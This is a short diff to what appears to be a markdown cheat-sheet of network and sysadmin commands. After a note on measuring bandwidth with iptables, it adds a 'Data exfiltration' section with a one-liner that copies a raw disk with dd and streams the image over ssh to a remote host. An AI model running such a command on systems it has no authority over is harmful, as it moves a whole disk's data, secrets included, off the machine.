@@ -510,3 +510,10 @@ Do whatever you wanted to measure bandwidth for
 ...
 iptables -vn -L; # this displays a printout showing how much data was transferred.
 ```
+
+# Data exfiltration
+
+## dd a disk and pass the image over ssh
+```
+dd if=/dev/whatever bs=65535 conv=noerror,sync | ssh -C user@host "cat >image.dd"
+```
